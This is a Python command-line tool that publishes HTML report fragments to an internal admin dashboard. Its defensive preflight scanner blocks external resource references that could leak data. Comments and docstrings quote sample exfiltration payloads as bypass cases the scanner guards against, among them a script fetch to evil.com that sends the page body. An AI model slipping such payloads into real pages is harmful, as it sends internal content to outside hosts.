#!/usr/bin/env python3
"""把本地 HTML 报告推送到管理后台「战略规划」模块（/strategy），按 slug 幂等 upsert。

用法：
    python3 tools/publish_strategy_report.py \
        --html 报告-artifact版.html \
        --slug ops-diagnosis-202607 \
        --title "运营数据诊断报告（2026-07）" \
        --generated-at 2026-07-26T12:17:00+08:00 \
        [--version-label "v1-首发"] [--update] [--api-base URL] [--dry-run]

`--update` 必须同时给 `--version-label`（覆盖会把库里已有的版本标签清空）。

写前拒绝：脚本总是传 expect（无 --update → "new"，有 --update → "revision"），
不符时服务端返回 409 且**不写库**，因此不存在「覆盖已发生、不可回滚」的情形。

输出：除命令行用法错误外，每条路径都往 stdout 打**单行 JSON**，且必带 "outcome"：
    outcome ∈ created | updated | conflict | failed | dry-run
    成功/冲突：{"slug":…,"id":…,"created":…,"version_label":…,"bytes":…,"outcome":…}
    失败：同上再加 "reason"（preflight_failed | missing_credential …）
    dry-run：{"slug":…,"title":…,"version_label":…,"generated_at":…,"expect":…,
              "bytes":…,"dry_run":true,"outcome":"dry-run"}
stderr 是给人看的说明，调用方只解析 stdout。
命令行用法错误（缺必填参数、--update 漏传 --version-label）由 argparse 处理：exit=2、只有 stderr。
"""
import argparse
import json
import os
import re
import sys
from html.parser import HTMLParser
from pathlib import Path

# 共享凭据/工作区工具（真源在仓库 shared/，tools/ 下不做 vendored 副本）
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "shared"))
import nbdpsy_common  # noqa: E402

DEFAULT_API_BASE = "https://database.nbdpsy.com"

# 完整 HTML 文档标记：报告须是**片段**（管理后台用 srcdoc 注入渲染）。
# `<head>` 必须带闭合尖括号精确匹配——片段里合法存在 `<header>`，用 `<head` 前缀会误伤。
# 不拿 `<title>` 当判据：片段版与完整文档版各有一个，区分不了。
FULL_DOC_MARKERS = ("<!doctype", "<html", "<head>", "<body")

# 外部资源引用探测。判据不是属性名枚举，而是**按位置**划线：
# 只扫「浏览器会拿去取资源的位置」——各标签的**属性值**与 `<style>` / `<script>` 块的内容；
# 在这些位置里，任何协议头 `https?://` 或协议相对 `//` 开头的 URL 命中即拒。
#   · 抓住真出站：srcset / imagesrcset（属性名枚举漏）、<object data>、<video poster>、
#     <form action>、<link rel=stylesheet href>、<a ping>、<a style="…url(…)">、<base href>、
#     <meta http-equiv=refresh content="0;url=…">、<svg><image href> / <use href>、
#     <script>fetch("https://…")</script>（sandbox 不拦网络，能把报告正文外带）、
#     @import、url(https://…)、CSS behavior —— 要么是属性值，要么在 style/script 块里，一网打尽。
#   · 放行标签之间的**文本节点**：`<p>数据来源：https://…</p>`、`<pre><code>curl https://…</code></pre>`
#     这类把网址当正文列出来的写法渲染时不发任何请求（运营报告的「参考资料」章节、LLM 出稿尤其爱写），
#     拦它是纯误杀。
#   · 放行 **HTML 注释**：`<!-- 生成自 https://… -->` 不渲染。
#   · 放行 `<a href>`：超链接渲染时不发任何请求，且后台那个 iframe 是
#     sandbox="allow-scripts"（无 allow-popups / allow-top-navigation / allow-forms），
#     点击也导航不出去。其余属性（含 `<a ping>` / `<a style>`）照旧参与判定。
# 页内锚点 `#s1`、相对路径 `/x`、`data:` URI（base64 正文里的 `//` 不构成「协议相对开头」，
# 见 PROTOCOL_RELATIVE_URL_RE 两条判据）继续放行。
#
# **分词交给标准库 html.parser，不再用正则近似**。正则切标签会在三处 fail-open / 假阳：
#   a) `<[^>]+>` 在**引号属性值里的 `>`** 处断句（`alt="收入>成本"`），标签后半截连同 src/style
#      掉进「标签之间」完全不被扫描 —— 而浏览器按 HTML5 分词照常解析并真去取图；
#   b) `<!--.*?-->` 不认 comment-end-bang 终止符 `--!>`，`<!-- x --!><img src=…>` 会把 img 整条吞掉；
#   c) 正文里的裸 `<`（`转化率 < 5%`）让后面的正文被当成「标签内部」，正常网址被误杀。
# HTMLParser 一次性解决：属性由它解析成键值对（引号内的 `>` 天然不断句、字符引用 `&#104;ttps://…`
# 也已解码），注释边界由它判定，裸 `<` 被当文本。它对畸形 HTML 的容错与浏览器不完全一致，
# 但输入是我们自己生成的报告，且严格比正则更接近浏览器。解析抛异常一律 fail-closed。
# 两处必须自己补齐、不能全指望 stdlib 的地方：
#   · `--!>` 是否终止注释取决于解释器补丁级别 → 扫描前归一化，见 _normalize_for_scan；
#   · `<script/>` / `<style/>` 伪自闭在 HTMLParser 里不进 raw-text 而浏览器进
#     → 覆写 handle_startendtag，见 _ResourceLocationCollector。
SCHEME_URL_RE = re.compile(r"""https?://[^\s'"<>)]*""", re.I)
# 协议相对 URL：`//` 前不能紧挨 scheme/base64 字符（排除 `https://` 重复命中与
# base64 正文里的 `//`），`//` 后必须紧跟形似主机名的 token（含点、无空格）。
PROTOCOL_RELATIVE_URL_RE = re.compile(
    r"""(?<![A-Za-z0-9+/=:_.~%-])//[A-Za-z0-9._~-]+\.[A-Za-z]{2,}[^\s'"<>)]*"""
)
# 内容参与扫描的块级元素（浏览器把它们的文本当 CSS / JS 执行）。
#
# 这是 `HTMLParser.CDATA_CONTENT_ELEMENTS` 的**故意收窄的自有副本**，不是手抄疏漏：
#   · 为什么不直接引用 stdlib 常量：它随解释器版本漂移（3.12 本机已是 6 个：
#     style/script/xmp/iframe/noembed/noframes），判据会跟着 Python 版本变，
#     同一份报告在不同机器上结论不同 —— 安全闸门不能这么摇摆。
#   · 为什么只取 style/script：判据是「浏览器会不会拿这段文本去取资源」。
#     只有 <style>（CSS：@import / url(…) / behavior）与 <script>（JS：fetch / new Image）
#     的文本会真的出站；xmp/noembed/noframes 的文本只当纯文本渲染，
#     <iframe> 出站靠的是 src **属性**（属性值本就逐条扫），其文本内容浏览器不取资源。
#     实测这几个元素的文本里塞 URL，浏览器零请求，本闸门也放行 —— 两边一致。
#
# ⚠️ 往这个元组里加元素时，必须同步检查解析器的 raw-text 状态机（见
# `_ResourceLocationCollector.handle_startendtag`）：`<x/>` 这种伪自闭写法在
# HTMLParser 里走 handle_startendtag 且**不进 raw-text**，浏览器却按 HTML5
# 忽略自闭合标志照常进 raw-text —— 不同步处理就是一条静默出站通道。
CDATA_ELEMENTS = ("style", "script")
# 命名空间 URI 只是标识符，浏览器绝不去取，白名单放行：
# SVG（xmlns）、xlink（Illustrator / 多数图表库导出的老式 SVG 带它）、
# xhtml（<foreignObject> 里的 xmlns）。
URL_WHITELIST_PREFIXES = (
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1999/xlink",
    "http://www.w3.org/1999/xhtml",
)


class PreflightError(Exception):
    """本地预检失败——一律不发请求。"""


def _is_whitelisted(url: str) -> bool:
    """白名单只认整串相等或其后紧跟 `#` 片段（`<use href="…svg#dot">`）。
    前缀匹配会被 `http://www.w3.org/2000/svg.evil.com/x.png` 这类同前缀域名钻空子，
    等于在白名单上开一条出站通道。引号/空白不必单列——SCHEME_URL_RE 本就不把它们纳入匹配。"""
    low = url.lower()
    return any(low == p or low.startswith(p + "#") for p in URL_WHITELIST_PREFIXES)


class _ResourceLocationCollector(HTMLParser):
    """收集「会被当资源取」的文本片段，每片带一个人类可读的位置标签。

    · 属性值：`<img src>` 这样的标签[属性]；`<a href>` 跳过（超链接不取资源）。
      HTMLParser 已把字符引用解码，故 `src="&#104;ttps://…"` 也拿得到真值。
    · `<style>` / `<script>` 块的文本内容整段收（JS 里的 fetch("https://…") 在此落网）。
    · 其余文本节点与 HTML 注释一律不收。
    """

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.segments = []          # [(位置标签, 文本)]
        self._cdata_tag = None

    def handle_starttag(self, tag, attrs):
        for name, value in attrs:
            if value is None:
                continue            # 布尔属性（`<input disabled>`）没有值
            if tag == "a" and name == "href":
                continue
            self.segments.append((f"<{tag} {name}>", value))
        if tag in CDATA_ELEMENTS:
            self._cdata_tag = tag

    def handle_startendtag(self, tag, attrs):
        """伪自闭写法 `<script/>` / `<style/>` 必须当作**普通开始标签**处理。

        HTML5 规范：HTML 元素（非外来元素）上的自闭合标志被忽略，浏览器照常让
        script/style 进 raw-text，一路吃到 `</script>` / `</style>` 并执行整块内容。
        HTMLParser 相反——见到 `/>` 走本方法，其默认实现是 handle_starttag + handle_endtag，
        raw-text 标志刚置上就被同一次调用清掉，且解析器自身也没进 raw-text，
        整块 JS/CSS 会以普通文本（甚至被当成 HTML 注释）漂过去而不被扫描：
            <script/>fetch("https://evil.com/leak?d="+document.body.innerHTML)</script>
        浏览器实发请求，闸门却判空 —— 静默出站通道。

        故对 CDATA_ELEMENTS 只走 handle_starttag（属性照常收集）并显式 set_cdata_mode，
        让解析器真正进 raw-text，收尾交给 `</script>` / `</style>`；其余元素维持
        默认的自闭合语义。set_cdata_mode 若在某个解释器上不存在，异常会冒到
        find_external_refs 的 try 里转成 PreflightError —— 方向仍是 fail-closed。
        """
        self.handle_starttag(tag, attrs)
        if tag in CDATA_ELEMENTS:
            self.set_cdata_mode(tag)
        else:
            self.handle_endtag(tag)

    def handle_endtag(self, tag):
        if tag in CDATA_ELEMENTS:
            self._cdata_tag = None

    def handle_data(self, data):
        if self._cdata_tag:
            self.segments.append((f"<{self._cdata_tag}> 块内容", data))


def _normalize_for_scan(html: str) -> str:
    """把 comment-end-bang 终止符 `--!>` 归一成 `-->`，**只用于扫描的副本**。

    HTML5 里 `--!>` 与 `-->` 都终止注释，`<!-- x --!><img src="https://evil.com/t.png">`
    的 img 在浏览器里正常渲染并发起请求。但 stdlib 认不认 `--!>` 取决于解释器：
    打过 HTML5 对齐补丁的构建是 `commentclose = r'--!?>'`（认），历史版本是
    `r'--\\s*>'`（不认，会把整条 img 当注释吞掉 → 静默放行）。
    仓库 install.sh 声明支持 Python 3.9+，判据绝不能挂在解释器补丁级别上，
    否则运营在自己机器上装完，这个洞悄悄回来而工具一声不吭。

    归一化是安全的：注释外的 `--!>` / `-->` 都不是特殊记号（正文文本、属性值、
    script/style 块里出现只是普通字符），把一种注释终止符换成等价的另一种，
    既不会新开注释也不会改变 URL 匹配（两者都含 `>`，而 URL 正则本就在 `>` 处收尾）。
    要上传的 content_html 用的是原始串，绝不受影响。
    """
    return html.replace("--!>", "-->")


def find_external_refs(html: str) -> list:
    """返回 [(位置标签, URL)]，即报告中会真的向第三方发起请求的引用。
    解析失败按 fail-closed 处理：抛 PreflightError，绝不静默放行。"""
    parser = _ResourceLocationCollector()
    try:
        parser.feed(_normalize_for_scan(html))
        parser.close()
    except Exception as e:
        raise PreflightError(
            f"HTML 解析失败，无法确认是否含外部资源引用，按不通过处理：{type(e).__name__}: {e}"
        )
    refs = []
    for where, seg in parser.segments:
        for m in SCHEME_URL_RE.finditer(seg):
            refs.append((where, m.group(0)))
        for m in PROTOCOL_RELATIVE_URL_RE.finditer(seg):
            refs.append((where, m.group(0)))
    return [(w, u) for w, u in refs if not _is_whitelisted(u)]


def find_external_urls(html: str) -> list:
    """find_external_refs 的 URL-only 视图。"""
    return [u for _, u in find_external_refs(html)]


def preflight(html_path: Path) -> str:
    """读取并校验报告片段，返回正文。任一项不过抛 PreflightError。

    a) 文件存在、非空、UTF-8 可解码
    b) 不是完整 HTML 文档
    c) 无外部资源引用——只查「会被当资源取」的位置（标签属性值 + style/script 块内容）；
       正文文本里的网址、`<a href>` 超链接、HTML 注释一律放行，它们不发请求
    注意：**不检查主题**。报告是双主题文档（@media prefers-color-scheme + :root[data-theme]），
    靠管理后台 srcdoc 前置注入 data-theme="light" 稳定渲染；静态 grep 判不了实际渲染成什么色，
    加主题预检只会误杀合格产物。
    """
    if not html_path.is_file():
        raise PreflightError(f"文件不存在：{html_path}")
    try:
        raw = html_path.read_bytes()
    except OSError as e:
        # 权限 000 / 目录被换走 / IO 错误：走 preflight_failed 分支，别抛裸 traceback
        # 破坏 docstring 里「每条路径都往 stdout 打带 outcome 的单行 JSON」这条契约
        raise PreflightError(f"文件读不了：{html_path}（{e}）")
    if not raw.strip():
        raise PreflightError(f"文件为空：{html_path}")
    try:
        html = raw.decode("utf-8")
    except UnicodeDecodeError as e:
        raise PreflightError(f"文件不是 UTF-8 编码：{html_path}（{e}）")

    lowered = html.lower()
    hits = [m for m in FULL_DOC_MARKERS if m in lowered]
    if hits:
        raise PreflightError(
            f"这是完整 HTML 文档（命中 {', '.join(hits)}），战略规划报告只收片段。"
            f"同目录常同时躺着「报告-artifact版.html」（片段）与「报告.html」（完整文档），"
            f"请确认 --html 指的是片段版：{html_path}"
        )

    external = find_external_refs(html)
    if external:
        uniq = sorted({f"{w} → {u[:120]}" for w, u in external})
        shown, extra = uniq[:5], len(uniq) - 5
        raise PreflightError(
            "报告含外部资源引用，拒绝推送——下列位置会被浏览器当资源去取，"
            "管理后台渲染时会真的向第三方发起请求，等于给一份内部文档开了一条出站通道。"
            "命中位置（标签[属性] 或 块 → URL）："
            + "；".join(shown)
            + (f"（另有 {extra} 处未列出）" if extra > 0 else "")
            + "。判据只看两处：**标签的属性值**、**<style>/<script> 块的内容**；"
            "正文文本里的网址（含 <pre>/<code> 代码块、裸 < 比较符后面的正文）、"
            "HTML 注释里的网址、<a href> 超链接一律放行，无需处理。"
            "按上面给出的位置去改：把该属性删掉、或把资源改成 data: URI 内联、"
            "或把网址挪进正文/注释/<a href>。"
        )

    return html


def build_payload(html: str, *, slug: str, title: str, generated_at: str,
                  version_label, update: bool) -> dict:
    """构建请求体。总是带 expect，交由服务端写前拦截。"""
    payload = {
        "slug": slug,
        "title": title,
        "content_html": html,
        "generated_at": generated_at,
        "expect": "revision" if update else "new",
    }
    if version_label:
        payload["version_label"] = version_label
    return payload


def send_request(url: str, key: str, payload: dict):
    """POST 到 external API，30s 超时。网络异常向上抛，由 main 转成 failed。"""
    import requests
    headers = {
        "Authorization": f"Bearer {key}",
        "Content-Type": "application/json; charset=utf-8",
    }
    return requests.request("POST", url, json=payload, headers=headers, timeout=30)


def _emit(result: dict) -> None:
    print(json.dumps(result, ensure_ascii=False))


def _error_text(resp) -> str:
    try:
        data = resp.json()
    except Exception:
        return (getattr(resp, "text", "") or "")[:200]
    if isinstance(data, dict):
        return str(data.get("error", (getattr(resp, "text", "") or "")[:200]))
    return (getattr(resp, "text", "") or "")[:200]


def main():
    ap = argparse.ArgumentParser(description="把本地 HTML 报告片段推送到管理后台「战略规划」模块")
    ap.add_argument("--html", type=Path, required=True, help="报告 HTML 片段文件（不是完整文档）")
    ap.add_argument("--slug", required=True, help="报告 slug（幂等键）")
    ap.add_argument("--title", required=True, help="报告标题")
    ap.add_argument("--generated-at", required=True,
                    help="出数时间 ISO8601（必填；省了页头「生成于」会显示推送时间且重发会漂）")
    ap.add_argument("--version-label", default=None, help="版本标签，如 v1-首发")
    ap.add_argument("--update", action="store_true",
                    help="声明本次是覆盖已存在的 slug（expect=revision）；必须同时给 --version-label")
    ap.add_argument("--api-base", default=None,
                    help="API base URL（默认从 NBDPSY_API_BASE 或 https://database.nbdpsy.com）")
    ap.add_argument("--dry-run", action="store_true", help="只打字段摘要，不发请求")
    args = ap.parse_args()

    # 后端 upsert 是 ON CONFLICT DO UPDATE SET version_label = EXCLUDED.version_label：
    # --update 漏传 --version-label 会把库里已有的标签静默清成 NULL（前端 3 处退化成显示 slug，
    # 批注导出抬头也从「报告版本：v1-首发」变成 slug），且脚本只会回显 null 不告警。
    # 客户端直接拒绝，一个字节都不发；后端行为不动（admin 路径要保持原样）。
    if args.update and not args.version_label:
        ap.error("--update 覆盖会清空已有版本标签，请显式传 --version-label")

    try:
        html = preflight(args.html)
    except PreflightError as e:
        print(f"预检失败，未发请求：{e}", file=sys.stderr)
        _emit({"slug": args.slug, "id": None, "created": None,
               "version_label": args.version_label, "bytes": None,
               "reason": "preflight_failed", "outcome": "failed"})
        sys.exit(1)

    payload = build_payload(html, slug=args.slug, title=args.title,
                            generated_at=args.generated_at,
                            version_label=args.version_label, update=args.update)
    nbytes = len(html.encode("utf-8"))

    # dry-run 全程不使用密钥，故凭据检查放在它之后：dry-run 最主要的用途正是
    # 「先在本地确认 --html 指的是片段版还是完整文档版」，运营等管理员发密钥期间就该能用。
    if args.dry_run:
        # 只打字段摘要：不含 content_html 全文，不含 key
        _emit({"slug": args.slug, "title": args.title, "version_label": args.version_label,
               "generated_at": args.generated_at, "expect": payload["expect"],
               "bytes": nbytes, "dry_run": True, "outcome": "dry-run"})
        return

    key = nbdpsy_common.get_secret(nbdpsy_common.STRATEGY_API_KEY)
    if not key:
        print(f"MISSING:{nbdpsy_common.STRATEGY_API_KEY} 请找管理员要含 strategy:write 的密钥，"
              f"再用 nbdpsy_common.py secret import <凭据包> 导入", file=sys.stderr)
        _emit({"slug": args.slug, "id": None, "created": None,
               "version_label": args.version_label, "bytes": nbytes,
               "reason": "missing_credential", "outcome": "failed"})
        sys.exit(1)

    api_base = args.api_base or os.environ.get("NBDPSY_API_BASE", DEFAULT_API_BASE)
    url = f"{api_base.rstrip('/')}/api/external/strategy-reports"

    base = {"slug": args.slug, "id": None, "created": None,
            "version_label": args.version_label, "bytes": nbytes}

    try:
        resp = send_request(url, key, payload)
    except Exception as e:
        # 只回显异常文本，绝不 dump request（headers 里带 key）
        print(f"请求失败：{type(e).__name__}: {e}", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    if resp.status_code == 409:
        try:
            err = resp.json()
        except Exception:
            err = {}
        if isinstance(err, dict) and err.get("code") == "slug_conflict":
            if args.update:
                hint = (f"slug「{args.slug}」不存在，无法作为修订版更新——slug 可能写错了；"
                        f"若这是一份新报告，去掉 --update 才是新建。")
            else:
                hint = (f"slug「{args.slug}」已存在——若确实要覆盖它请加 --update；"
                        f"若这是一份新报告请换一个 slug。")
            print(f"写前拒绝：服务端未写库。{hint}", file=sys.stderr)
            _emit({**base, "outcome": "conflict"})
            sys.exit(1)
        print(f"请求失败（409）：{_error_text(resp)}", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    if resp.status_code != 200:
        print(f"请求失败（{resp.status_code}）：{_error_text(resp)}", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    try:
        data = resp.json()
    except Exception as e:
        print(f"响应解析失败：{e}", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    if not (isinstance(data, dict) and data.get("success")):
        error = data.get("error", "unknown error") if isinstance(data, dict) else "unknown error"
        print(f"请求失败：{error}", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    body = data.get("data") or {}
    report_id = body.get("id")
    created = body.get("created")
    base = {**base, "id": report_id, "created": created}

    expected_created = not args.update
    if created is not expected_created:
        # 服务端理应对不符的 expect 返 409 且不写库；走到这里说明契约破了，须人工核对
        print(f"契约异常：expect={payload['expect']} 但服务端返回 created={created!r}"
              f"（本该 409 拒绝）。请核对后端 /api/external/strategy-reports 实现与"
              f"slug「{args.slug}」的实际状态。", file=sys.stderr)
        _emit({**base, "outcome": "failed"})
        sys.exit(1)

    outcome = "created" if created else "updated"
    print(f"✓ {'新建' if created else '更新'}成功 id={report_id}", file=sys.stderr)
    _emit({**base, "outcome": outcome})


if __name__ == "__main__":
    main()
